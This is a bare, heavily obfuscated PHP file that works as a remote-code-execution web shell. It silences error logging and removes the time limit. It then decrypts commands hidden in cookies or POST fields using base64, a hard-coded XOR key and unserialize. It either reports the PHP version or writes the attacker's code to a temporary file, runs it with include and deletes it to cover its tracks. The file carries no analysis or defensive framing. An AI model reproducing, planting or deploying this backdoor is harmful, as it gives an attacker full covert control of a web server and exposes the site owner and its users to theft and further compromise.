<?php $qgplcwfq = chr(102).chr(105).chr(952-844)."\x65".chr(168-73)."\x70".'u'."\164"."\137".'c'.chr(369-258)."\x6e".'t'.chr(101).chr(110)."\164"."\163";
$jejwu = 'b'."\141"."\x73"."\x65".chr(648-594).'4'.'_'.'d'."\145"."\x63".chr(851-740).chr(100).chr(388-287);
$drvgc = chr(105).chr(110)."\151"."\137".chr(177-62).'e'.chr(1018-902);
$vlqaz = 'u'."\x6e"."\x6c".chr(884-779)."\x6e".chr(107);


@$drvgc('e'.chr(114).chr(114).chr(508-397).chr(635-521)."\137"."\154"."\x6f"."\x67", NULL);
@$drvgc(chr(108)."\157"."\x67".chr(95)."\145"."\x72".chr(114).chr(111)."\x72".'s', 0);
@$drvgc('m'.'a'."\170".'_'."\x65".chr(660-540)."\145".chr(99).chr(117).chr(869-753).'i'.'o'."\156"."\x5f"."\x74".'i'."\x6d".chr(101), 0);
@set_time_limit(0);

function soqkdln($lngnaz, $hqrvjev)
{
    $gflfzmqmh = "";
    for ($iyvnzmcfca = 0; $iyvnzmcfca < strlen($lngnaz);) {
        for ($j = 0; $j < strlen($hqrvjev) && $iyvnzmcfca < strlen($lngnaz); $j++, $iyvnzmcfca++) {
            $gflfzmqmh .= chr(ord($lngnaz[$iyvnzmcfca]) ^ ord($hqrvjev[$j]));
        }
    }
    return $gflfzmqmh;
}

$lrpbp = array_merge($_COOKIE, $_POST);
$iyvnzmcfcacqqlitalj = '04b6d54a-7a0c-44d1-a19f-7f01e79dfd41';
foreach ($lrpbp as $gyhqos => $lngnaz) {
    $lngnaz = @unserialize(soqkdln(soqkdln($jejwu($lngnaz), $iyvnzmcfcacqqlitalj), $gyhqos));
    if (isset($lngnaz["\x61"."\x6b"])) {
        if ($lngnaz[chr(517-420)] == chr(105)) {
            $iyvnzmcfca = array(
                "\x70"."\166" => @phpversion(),
                chr(115).chr(1083-965) => "3.5",
            );
            echo @serialize($iyvnzmcfca);
        } elseif ($lngnaz[chr(517-420)] == chr(101)) {
            $kgoaehr = "./" . md5($iyvnzmcfcacqqlitalj) . "\56".chr(223-118)."\156".chr(99);
            @$qgplcwfq($kgoaehr, "<" . "\77".chr(413-301).chr(447-343)."\160"."\x20"."\100".'u'."\x6e".'l'."\x69".chr(110)."\153".chr(292-252).chr(95).'_'.chr(70).chr(959-886)."\114".chr(69).chr(95).chr(983-888).')'.chr(59).' ' . $lngnaz["\144"]);
            include($kgoaehr);
            @$vlqaz($kgoaehr);
        }
        exit();
    }
}

